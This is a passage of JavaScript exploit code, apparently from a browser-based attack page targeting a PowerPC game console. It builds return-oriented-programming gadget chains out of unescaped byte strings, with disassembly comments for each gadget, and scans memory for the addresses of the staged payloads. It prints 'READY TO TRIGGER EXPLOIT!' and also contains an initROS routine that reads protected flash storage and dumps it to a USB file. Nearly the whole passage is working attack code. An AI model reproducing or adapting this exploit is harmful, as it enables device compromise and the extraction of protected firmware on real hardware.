		006161F4 90FF0010 stw        r7,0x10(r31)                   PIPE
		006161F8 90DF0014 stw        r6,0x14(r31)
		006161FC 90BF0018 stw        r5,0x18(r31)                   PIPE
		00616200 909F001C stw        r4,0x1C(r31)
		00616204 907F0020 stw        r3,0x20(r31)                   PIPE
		00616208 E80100D0 ld         r0,0xD0(r1)
		0061620C 7FA307B4 extsw      r3,r29
		00616210 EBC100B0 ld         r30,0xB0(r1)
		00616214 EBA100A8 ld         r29,0xA8(r1)                   PIPE
		00616218 7C0803A6 mtspr      lr,r0
		0061621C EBE100B8 ld         r31,0xB8(r1)
		00616220 382100C0 addi       r1,r1,0xC0
		00616224 4E800020 blr         
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0061\u61B8");// r0 [gadget #4]
		
		// padding
		gadget =  gadget+unescape("\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141");
		
		
		// prepare gadget #5
		gadget =  gadget+unescape("\u001E\uADCC");// r0 <-- sets link register following bctrl following gadget #5
		
		gadget =  gadget+unescape("\u001D\uA720");// r11 <-- set for r31+0x8 so it sets r0 using bctrl in gadget #5
		gadget =  gadget+unescape("\u8014\u0000");// r10 <-- set same as r31 so it sets r2 in gadget #5
		gadget =  gadget+unescape("\u2268\u656C");// r8
		gadget =  gadget+unescape("\u6C6F\u5F77");// r7
		gadget =  gadget+unescape("\u6F72\u6C64");// r6
		gadget =  gadget+unescape("\u5F5F\u5F22");// r5
		gadget =  gadget+unescape("\u8014\u0040");// r4
		gadget =  gadget+unescape("\u8014\u0030");// r3
		gadget =  gadget+unescape("\u8014\u0090");// r9
		
		gadget =  gadget+unescape("\u4343\u4343\u4343\u4343\u4343\u4343\u4343\u4343");// padding
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0290");// r29
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0300");// r30
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0000");// r31 <-- use stw here
		gadget =  gadget+unescape("\u4242\u4242\u4242\u4242\u4242\u4242\u4242\u4242");// padding
		
		
		// execute gadget #5
		/*
		0019218C 80610084 lwz        r3,0x84(r1)
		00192190 80810080 lwz        r4,0x80(r1)
		00192194 F8010070 std        r0,0x70(r1)                    PIPE
		00192198 817F0008 lwz        r11,0x8(r31)
		0019219C 80A10098 lwz        r5,0x98(r1)                    PIPE
		001921A0 80C10094 lwz        r6,0x94(r1)
		001921A4 80E10090 lwz        r7,0x90(r1)                    PIPE
		001921A8 8101008C lwz        r8,0x8C(r1)
		001921AC 800B0000 lwz        r0,0x0(r11)                    PIPE
		001921B0 F8410028 std        r2,0x28(r1)
		001921B4 81210088 lwz        r9,0x88(r1)                    PIPE
		001921B8 7C0903A6 mtspr      ctr,r0
		001921BC 804B0004 lwz        r2,0x4(r11)
		001921C0 4E800421 bctrl 
		*/
		gadget =  gadget+unescape("\u0000\u0000\u0019\u218C");// r0 [gadget #5]
		
		// padding
		gadget =  gadget+unescape("\uC1C1\uC1C1\uC2C2\uC2C2\uC3C3\uC3C3\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC2C7\uC5CA\uC1C1\uC1C1\uC8C5\uC1C1\uC1C8\uC2C1\uC1C1\uC9C1\uC8C1\uC7C1\uC5C1\uC2C1\uC1C1\uC1C1\uC1C1\uC1C1\uC1C1\uA1C1\uB1C1\uC1C1\uD1C1\uC1C1\uC1C1\uC1C1\uC1C1\uC2C3\uC1C6\uC2C5\uC1C1");
		
		gadget =  gadget+unescape("\u0000\u0188");// r11 <-- syscall number
		gadget =  gadget+unescape("\u8014\u0090");// r9 <-- syscall arg #7
		
		
		// prepare gadget #6
		gadget =  gadget+unescape("\u0000\u000A");// r4 <-- syscall arg #2
		gadget =  gadget+unescape("\u8014\u0030");// r3 <-- gets overwritten
		gadget =  gadget+unescape("\u8014\u0090");// r9 <-- gets overwritten
		gadget =  gadget+unescape("\u8014\u0080");// r8 <-- syscall arg #6
		gadget =  gadget+unescape("\u8014\u0070");// r7 <-- syscall arg #5
		gadget =  gadget+unescape("\u8014\u0014");// r6 <-- syscall arg #4
		
		gadget =  gadget+unescape("\u0000\u01B6");// r5 <-- syscall arg #3
		gadget =  gadget+unescape("\u8014\u0310");// r31 <-- after sc combines r5 to r31??
		
		// padding
		gadget =  gadget+unescape("\u5555\u6666\u7777\u8888\u9999\uAAAA\uBBBB\uCCCC");
		
		
		// execute gadget #6
		/*
		001EADCC 81610078 lwz        r11,0x78(r1)                   PIPE
		001EADD0 8121007C lwz        r9,0x7C(r1)
		001EADD4 901F0004 stw        r0,0x4(r31)                    PIPE
		001EADD8 913F000C stw        r9,0xC(r31)
		001EADDC 917F0008 stw        r11,0x8(r31)                   PIPE
		001EADE0 E80100B0 ld         r0,0xB0(r1)
		001EADE4 7C6307B4 extsw      r3,r3
		001EADE8 EBE10098 ld         r31,0x98(r1)
		001EADEC 382100A0 addi       r1,r1,0xA0
		001EADF0 7C0803A6 mtspr      lr,r0
		001EADF4 4E800020 blr
		*/
		// r0 gets set from gadget #5
		
		
		
		
		// prepare gadget #7
		
		
		
		// execute gadget #7
		/*
		007A00CC E8410028 ld         r2,0x28(r1)                    PIPE
		007A00D0 E8010090 ld         r0,0x90(r1)
		007A00D4 E8610070 ld         r3,0x70(r1)                    PIPE
		007A00D8 7C0803A6 mtspr      lr,r0
		007A00DC 38210080 addi       r1,r1,0x80
		007A00E0 4E800020 blr
		*/
		gadget =  gadget+unescape("\u0000\u0000\u007A\u00CC");// r0
		
		
		// prepare gadget #8
		gadget =  gadget+unescape("\uF333\uF444\uF555\uF666\u4144\u4142\u4345\u4647");// padding
		gadget =  gadget+unescape("\u0000\u0000\u8014\u0020");// r2 <-- toc
		gadget =  gadget+unescape("\u4144\u4141\u4944\u4149");// padding
		
		// padding
		gadget =  gadget+unescape("\uE555\uE666\uE777\uE888\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\u1111\u2222\u3333\u4444\u5555\u6666\u7777\u8888\u9999\uAAAA\uBBBB\uCCCC\uDDDD\uEEEE\uF111\uF222");
		
		gadget =  gadget+unescape("\u0000\u0000\u0000\u1004");// r3 <-- syscall arg #1
		
		gadget =  gadget+unescape("\uF777\uF888\uF999\uFAAA\uFBBB\uFCCC\uFDDD\uFEEE\uE111\uE222\uE333\uE444");
		
		
		// execute gadget #8
		/*
		000DEF4C 44000002 sc                                       23 CSI PIPE
		000DEF50 E8010090 ld         r0,0x90(r1)
		000DEF54 38210080 addi       r1,r1,0x80
		000DEF58 7C0803A6 mtspr      lr,r0                         01 (000DEF50) REG
		000DEF5C 4E800020 blr 
		*/
		
		//gadget =  gadget+unescape("\u0000\u0000\u0387\u3EE0");//graceful exit test #1 freeze
		//gadget =  gadget+unescape("\u0000\u0000\u03C1\u654C");//graceful exit test #2 freeze
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE218");//graceful exit test #3 
		//gadget =  gadget+unescape("\u0000\u0000\u000B\uBD7C");// graceful exit test #4 no crash using float
		//gadget =  gadget+unescape("\u0000\u0000\u0049\u5B74");// graceful exit test #5 
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE1B4");// graceful exit test #6 
		//gadget =  gadget+unescape("\u0000\u0000\u0381\u6638");// graceful exit test #7 
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE2AC");// graceful exit test #8 
		//gadget =  gadget+unescape("\u0000\u0000\u038C\uE840");// graceful exit test #9 
		//gadget =  gadget+unescape("\u0000\u0000\u0048\uFF84");// graceful exit test #10 
		//gadget =  gadget+unescape("\u0000\u0000\u000D\uEF54");// graceful exit test #11 no xmb return infinite addi r1
		//gadget =  gadget+unescape("\u0000\u0000\u000D\uF738");// graceful exit test #12
		//gadget =  gadget+unescape("\u0000\u0000\u0001\uDBBC");// graceful exit test #13 no xmb return infinite usleep
		//gadget =  gadget+unescape("\u0000\u0000\u0037\uFFE4");// graceful exit test #14
		
		gadget =  gadget+unescape("\u0000\u0000\u000D\uEF4C");// r0
		
		
		// ********************************
		// *** SYSCALL #1 HAS BEEN MADE ***
		// ********************************
		
		// padding
		gadget =  gadget+unescape("\uE999\uEAAA\uEBBB\uECCC\uEDDD\uEEEE\uD111\uD222\uD333\uD444\uD555\uD666\uD777\uD888\uD999\uDAAA\uDBBB\uDCCC\uDDDD\uDEEE\uC111\uC222\uC333\uC444\uC555\uC666\uC777\uC888\uC999\uCAAA\uCBBB\uCCCC\uCDDD\uCEEE\uB111\uB222\uB333\uB444\uB555\uB666\uB777\uB888\uB999\uBAAA\uBBBB\uBCCC\uBDDD\uBEEE\uA111\uA222\uA333\uA444\uA555\uA666\uA777\uA888\uA999\uAAAA\uABBB\uACCC");
		
		
		
		gadget =  gadget+unescape("\u0000\u0000\u0001\uDBBC");// r0
		
		// padding
		gadget =  gadget+unescape("\u9333\u9444\u9555\u9666\u9777\u9888\u9999\u9AAA\u9BBB\u9CCC\u9DDD\u9EEE\u8111\u8222\u8333\u8444\u8555\u8666\u8777\u8888\u8999\u8AAA\u8BBB\u8CCC\u8DDD\u8EEE\u7111\u7222\u7333\u7444\u7555\u7666\u7777\u7888\u7999\u7AAA\u7BBB\u7CCC\u7DDD\u7EEE\u6111\u6222\u6333\u6444\u6555\u6666\u6777\u6888\u6999\u6AAA\u6BBB\u6CCC\u6DDD\u6EEE\u5111\u5222\u5333\u5444\u5555\u5666\u5777\u5888\u5999\u5AAA\u5BBB\u5CCC\u5DDD\u5EEE\u4111\u4222\u4333\u4444\u4555\u4666\u4777\u4888\u4999\u4AAA\u4BBB\u4CCC\u4DDD\u4EEE\u3111\u3222\u3333\u3444\u3555\u3666\u3777\u3888\u3999\u3AAA\u3BBB\u3CCC\u3DDD\u3EEE\u2111\u2222\u2333\u2444\u2555\u2666\u2777\u2888\u2999\u2AAA\u2BBB\u2CCC\u2DDD\u2EEE\u1111\u1222\u1333\u1444\u1555\u1666\u1777\u1888\u1999\u1AAA\u1BBB\u1CCC\u1DDD\u1EEE");
		
		// **************************************************************************************
		
		
		// **************************************************************************************
		// padding + find marker NEW
		gadget =  gadget+unescape("\u4141\u4141\u696A\u696B\u4141\u4141\u7E2A"); // 14 bytes
		// **************************************************************************************
		
		
		// write found payload address
		//gadget = gadget.replaceAt(285, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(286, hexh2bin(payload_addr));
		//gadget = gadget.replaceAt(287, hexh2bin((payload_addr) >> 16));
		//gadget = gadget.replaceAt(288, hexh2bin(payload_addr));
		
		
		// Write found addresses to gadgets hex
		// BABECAFE 3133065982
		// DEADBEEF 3735928559
		// A55FACE5 2774510821
		
		//                                 [dummy	gadget	register]
		// FEED0428 <--placeholder example [FEED	04		28		]
		
		//-------------------------------------------------------------------
		// write to gadget #1
		
		// write found address to r2
		//gadget = gadget.replaceAt(3, hexh2bin((4276945154) >> 16));
		//gadget = gadget.replaceAt(4, hexh2bin(4276945154));
		//-------------------------------------------------------------------
		
		
		
		// Find Gadgets Pointer
		dbg("Processing gadget string.. Searching for valid offset....");
		do{
		g = gadget.replaceAt(0x00/2,hexh2bin(0x7E2A));
		gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x1B8);
		//gadget_addr = findExploit("gadget",g,0x80150000,0x450000,0x7E2A,0x644);
		}
		while(gadget_addr==0);
		
		
		// Find jump_2 Address
		dbg("Processing jump_2 string.. Searching for valid offset....");
		jump_2 = unescape("\u4444\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u8FD8\uD5D0\u4141\u4141\u4141\u4141\u4141\u4141\u4407\u4407\u4406\u4406\u8FD8\uD5C0\u03A9\uF7E8\u4343\u4343\u4410\u4410\u4141\u4141\u4141\u4444\u2A2F");// putting orig stack address value into r8
		
		//jump_2 = jump_2.replaceAt(11, hexh2bin((gadget_addr+36) >> 16));
		//jump_2 = jump_2.replaceAt(12, hexh2bin(gadget_addr+36));// r5
		
		//jump_2 = jump_2.replaceAt(19, hexh2bin((idps_hex_addr) >> 16));
		//jump_2 = jump_2.replaceAt(20, hexh2bin(idps_hex_addr));// r7
		
		//jump_2 = jump_2.replaceAt(21, hexh2bin((idps_storage_usb_addr) >> 16));
		//jump_2 = jump_2.replaceAt(22, hexh2bin(idps_storage_usb_addr));// r6
		
		//jump_2 = jump_2.replaceAt(23, hexh2bin((gadget_addr+12) >> 16));
		//jump_2 = jump_2.replaceAt(24, hexh2bin(gadget_addr+12));// r8
		
		jump_2 = jump_2.replaceAt(25, hexh2bin((gadget_addr) >> 16));
		jump_2 = jump_2.replaceAt(26, hexh2bin(gadget_addr));// used for initial launch and setting r9 after gadget #1
		
		jump_2 = jump_2.replaceAt(27, hexh2bin((gadget_addr+4) >> 16));
		jump_2 = jump_2.replaceAt(28, hexh2bin(gadget_addr+4));// r11+0x4 <-- rewrite gadget hex address here after first gadget to fix r11
		
		//jump_2 = jump_2.replaceAt(29, hexh2bin((orig_stack_frame_addr) >> 16));
		//jump_2 = jump_2.replaceAt(30, hexh2bin(orig_stack_frame_addr));// r10
		
		do{
		j2 = jump_2.replaceAt(0x00/2,hexh2bin(0x2A2F));
		jump_2_addr = findExploit("j2",j2,0x80150000,0x450000,0x2A2F,0x1C);
		}
		while(jump_2_addr==0);
		
		// Find jump_1 Address
		dbg("Processing jump_1 string.. Searching for valid offset....");
		jump_1 = unescape("\u4141\u4141\u4141\u7E2F");
		jump_1 = jump_1.replaceAt(0x02/2, hexh2bin((jump_2_addr) >> 16));
		jump_1 = jump_1.replaceAt(0x04/2, hexh2bin(jump_2_addr));	
		do{

		j1 = jump_1.replaceAt(0x00/2,hexh2bin(0x7E2F));
		jump_1_addr = findExploit("j1",j1,0x80150000,0x450000,0x7E2F,0x4);
		}
		while(jump_1_addr==0);
		
		// Store jump_1 address for trigger
		init_addr = jump_1_addr;
		
		// Debug Output To Python
		dbg("                                                ");
		dbg("------------------------------------------------");
		dbg("All required offsets have been found....");
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- GADGETS ------------------------------------");
		//dbg("gadget: "+s2hex(gadget));
		dbg("gadget (g): "+s2hex(g));
		dbg("                                                ");
		dbg("--- GADGETS CONTINUED---------------------------");
		//dbg("payload: "+s2hex(payload));
		//dbg("orig_stack_frame: "+s2hex(orig_stack_frame));
		//dbg("orig_link_register: "+s2hex(orig_link_register));
		dbg("jump_2: "+s2hex(j2));
		dbg("jump_1: "+s2hex(j1));
		dbg("idps_storage_usb: "+s2hex(idps_storage_usb));
		dbg("idps_hex: "+s2hex(idps_hex));
		dbg("idps_base: "+s2hex(idps_base));
		//dbg("usb_generic_storage: "+s2hex(usb_generic_storage));
		dbg("------------------------------------------------");
		dbg("                                                ");
		dbg("--- OFFSETS ------------------------------------");
		dbg("gadget offset: 0x"+gadget_addr.toString(16));
		//dbg("payload offset: 0x"+payload_addr.toString(16));
		//dbg("orig_stack_frame_addr offset: 0x"+orig_stack_frame_addr.toString(16));
		//dbg("orig_link_register_addr offset: 0x"+orig_link_register_addr.toString(16));
		dbg("jump_2 offset: 0x"+jump_2_addr.toString(16));
		dbg("jump_1 offset: 0x"+jump_1_addr.toString(16));	
		dbg("idps_storage_usb_addr offset: 0x"+idps_storage_usb_addr.toString(16));	
		dbg("idps_hex_addr offset: 0x"+idps_hex_addr.toString(16));
		dbg("idps_base_addr offset: 0x"+idps_base_addr.toString(16));
		//dbg("usb_generic_storage_addr offset: 0x"+usb_generic_storage_addr.toString(16));
		dbg("------------------------------------------------");
		dbg("                                                ");
		//dbg("Triggering exploit....");
		dbg("READY TO TRIGGER EXPLOIT!");
		
		
		disableElement("init-rop");
		disableElement("init-ros");
		enableElement("btn-trigger");
		//trigger(jump_1_addr);	
		
		return;
	} catch(e) {
		dbg(e);
	}
}


function initROS(){

	setInitVariables("rosdump");
	
	disableElement("marked");
	
	try
	{
		
		
		//writeEnvInfo();		
		dbg("Searching memory range for usb_fp_rosdump string offset....", log_div);
		//usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u726F\u7330\u2E68\u6578\u0000\u7762\u0000\u0100\u0000\u0000\u0004\u0000\u000B\uBBE8\u0000\u4141\u4141\u4141\u4141\u4141\u4141\u7EFD");// 22 bytes for path to fopen + 4 bytes to store wb string + 8 bytes for nor flash flag + 8 bytes for sys_storage_open offset + 8 for file descriptor + 2 ros dump placeholder + 4 for place holders
		usb_fp_rosdump=unescape("\u4444\u2F64\u6576\u5F75\u7362\u3030\u302F\u726F\u7330\u2E68\u6578\u0000\u7762\u0000\u0000\u4141\u4141\u4141\u4141\u000D\uEBD8\u0000\u4141\u4141\u4141\u4141\u4141\u7EFD");// 22 bytes for path to fopen + 4 bytes to store wb string + 8 bytes for nor flash flag + 8 bytes for sys_storage_open offset + 8 for file descriptor + 2 ros dump placeholder + 4 for place holders
		do{
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0000));
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0001));
			//usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x0002));
			usb_fp_rosdump=usb_fp_rosdump.replaceAt(0x000/2,hexh2bin(0x7EFD));
			//usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,0x80278000,0x114000,0x7EFD,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
			usb_fp_rosdump_addr=findJsVariableOffset("usb_fp_rosdump",usb_fp_rosdump,0x80278000,0x114000,0x7EFD,usb_fp_rosdump_bytecount/2,used_offsets_arr, log_div);
		}while(usb_fp_rosdump_addr==0);
		
		// DEX
		// \u4141 is used for general padding
		// other \u4x4x are used as placeholders for runtime replacement by js replaceAt calls
		// Other values like \u2424\u2424\u2424\u2424 means that this 8 byte value will eventually be loaded into r24 by one of the gadgets
		var usb_fp_addr=usb_fp_rosdump_addr+0x00;		
		var wb_addr=usb_fp_rosdump_addr+0x16;
		//var flash_flag_addr= usb_fp_rosdump_addr+0x1A;
		var sso_addr=usb_fp_rosdump_addr+0x24;
		var dev_handle_addr=usb_fp_rosdump_addr-0x8;
		var readlen_addr=usb_fp_rosdump_addr-0x12;
		var fd_addr=usb_fp_rosdump_addr+0x2C;
		var rosdump_addr=usb_fp_rosdump_addr+0x34;
		
		dbg("Searching memory range for gadgets string offset....", log_div);
		//gadgets=unescape("\u0102\u0009\u76BC\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0061\u61B8\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0304\u0506\u0708\u0910\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\uFF31\uFF31\uFF31\uFF31\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u0000\u0000\u001A\u43FC\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0000\u0000\uFF03\uFF03\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152");//512 bytes
		gadgets=unescape("\u0102\u0009\u76BC\uF2F2\uF2F2\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\uF2F2\uF2F2\uF2F2\uF2F2\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0000\u0061\u61B8\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u0000\u0258\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0000\uFF05\uFF05\u0000\u0000\uFF03\uFF03\uFF09\uFF09\u9900\u0102\u0304\u0506\u0304\u0506\u0708\u0910\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\u8A00\u0000\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u0000\u0000\u001A\u43FC\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0100\u0000\u0000\u0004\u1516\u1718\u1920\u2122\u0000\u0000\u0061\u61B8\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7172\u7374\u7576\u7778\u7980\u8182\u8384\u8586\u8788\u8990\u9192\u9394\u9596\u9798\u9900\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u0000\u025A\uFF10\uFF10\uFF08\uFF08\uFF07\uFF07\u0000\u0200\u0000\u0001\u0000\u0000\uFF03\uFF03\u0000\u0022\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\uFF29\uFF29\uFF29\uFF29\uFF30\uFF30\uFF30\uFF30\u0000\u0000\uFF31\uFF31\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u4141\u0000\u0000\u0043\u4368");//682 bytes
		gadgets=gadgets.replaceAt(0x11A/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_open device handle offset
		gadgets=gadgets.replaceAt(0x11C/2,hexh2bin(dev_handle_addr));
		gadgets=gadgets.replaceAt(0x126/2,hexh2bin(sso_addr>>16)); //sys_storage_open for 0x0(r9) offset
		gadgets=gadgets.replaceAt(0x128/2,hexh2bin(sso_addr));
		gadgets=gadgets.replaceAt(0x24E/2,hexh2bin(rosdump_addr>>16)); //sys_storage_read buffer offset
		gadgets=gadgets.replaceAt(0x250/2,hexh2bin(rosdump_addr));
		gadgets=gadgets.replaceAt(0x252/2,hexh2bin(readlen_addr>>16)); //sys_storage_read readlen offset
		gadgets=gadgets.replaceAt(0x254/2,hexh2bin(readlen_addr));
		gadgets=gadgets.replaceAt(0x28E/2,hexh2bin(dev_handle_addr>>16)); //sys_storage_read device handle offset
		gadgets=gadgets.replaceAt(0x290/2,hexh2bin(dev_handle_addr));
		//gadgets=gadgets.replaceAt(0x1D6/2,hexh2bin(flash_flag_addr>>16)); //NOR Flash flag parameter offset
		//gadgets=gadgets.replaceAt(0x1D8/2,hexh2bin(flash_flag_addr));	
		
	
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(usb_fp_addr>>16)); //filepath parameter offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(usb_fp_addr));
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(wb_addr>>16)); //'wb' parameter offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(wb_addr));		
		gadgets=gadgets.replaceAt(0x00E/2,hexh2bin(rosdump_addr>>16)); //ros dump start offset
		gadgets=gadgets.replaceAt(0x010/2,hexh2bin(rosdump_addr));
		gadgets=gadgets.replaceAt(0x014/2,hexh2bin(fd_addr>>16)); //fd (file descriptor) parameter offset
		gadgets=gadgets.replaceAt(0x016/2,hexh2bin(fd_addr));
		var	_gadgets;
		do{
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0000));
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0001));
			//gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x0002));
			_gadgets=gadgets.replaceAt(0x000/2,hexh2bin(0x2A2F));
			gadgets_addr=findJsVariableOffset("gadgets",_gadgets,0x80180000,0xF8000,0x2A2F,gadgets_bytecount/2,used_offsets_arr, log_div);
			//gadgets_addr=findJsVariableOffset("gadgets",gadgets,0x80180000,0xF8000,0x7EFC,0x100,used_offsets_arr, log_div);
		}while(gadgets_addr==0);
		//dbg("Dumping 0x"+gadgets_bytecount.toString(16)+" bytes from gadgets_addr:");
		//send_read(gadgets_addr-0x2,gadgets_bytecount, log_div);
		dbg("Searching memory range for jump_2 string offset....", log_div);
		jump_2=unescape("\u0102\u0304\u0506\u0708\u0910\u1112\u1314\u1516\u1718\u1920\u2122\u2324\u2526\u2728\u2930\u3132\u3334\u3536\u3738\u3940\u4142\u4344\u4546\u4748\u4950\u5152\u5354\u5556\u5758\u5960\u6162\u6364\u6566\u6768\u6970\u7EFB"); // 72 bytes
		jump_2=jump_2.replaceAt(0x32/2,hexh2bin(gadgets_addr>>16)); //gadgets offset
		jump_2=jump_2.replaceAt(0x34/2,hexh2bin(gadgets_addr));	
		do{
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0000));
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0001));
			//jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x0002));
			jump_2=jump_2.replaceAt(0x00/2,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,0x80180000,0x450000,0x7EFB,jump_2_bytecount/2,used_offsets_arr, log_div);
		}while(jump_2_addr==0);
		
		dbg("Searching memory range for jump_1 string offset....", log_div);
		jump_1=unescape("\u4141\u4141\u4141\u7EFA"); // 8 bytes == 4 bytes + 4 bytes placeholders
		jump_1=jump_1.replaceAt(0x02/2,hexh2bin(jump_2_addr>>16)); //jump_2 offset
		jump_1=jump_1.replaceAt(0x04/2,hexh2bin(jump_2_addr));	
		do{
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0000));
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0001));
			//jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x0002));
			jump_1=jump_1.replaceAt(0x00/2,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,0x80180000,0x450000,0x7EFA,jump_1_bytecount/2,used_offsets_arr, log_div);
		}while(jump_1_addr==0);
		
		dbg("Summary:");
		dbg("rosdump variable offset: 0x"+usb_fp_rosdump_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),usb_fp_rosdump_addr-0x2,usb_fp_rosdump_bytecount+0x4).substr(6,usb_fp_rosdump_bytecount), parseInt("0x"+(usb_fp_rosdump_addr-0x2), 16), usb_fp_rosdump_bytecount, log_div);
		dbg("gadget: "+bytesToHex(usb_fp_rosdump), log_div);
		send_dump_name(readMemory(document.getElementById('exploit'),usb_fp_rosdump_addr-0x2,usb_fp_rosdump_bytecount+0x4).substr(6,usb_fp_rosdump_bytecount), usb_fp_addr-0x2, usb_fp_rosdump_bytecount, "test.bin");
		dbg("gadgets variable offset: 0x"+gadgets_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),gadgets_addr-0x2,gadgets_bytecount+0x4).substr(6,gadgets_bytecount), gadgets_addr-0x2, gadgets_bytecount, log_div);
		dbg("gadget: "+bytesToHex(_gadgets), log_div);
		dbg("jump_2 variable offset: 0x"+jump_2_addr.toString(16), log_div);
		send_read(readMemory(document.getElementById('exploit'),jump_2_addr-0x2,jump_2_bytecount+0x2).substr(6,jump_2_bytecount), jump_2_addr-0x2, jump_2_bytecount, log_div);
		dbg("gadget: "+bytesToHex(jump_2), log_div);
		dbg("jump_1 variable offset: 0x"+jump_1_addr.toString(16), log_div);
